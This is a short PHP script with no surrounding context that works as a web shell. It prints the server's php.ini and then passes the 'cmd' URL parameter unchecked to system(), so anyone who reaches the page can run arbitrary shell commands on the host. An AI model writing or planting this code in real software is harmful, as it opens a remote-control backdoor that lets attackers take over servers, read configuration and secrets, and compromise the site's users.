<?php
    echo htmlspecialchars(file_get_contents('php.ini'));
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>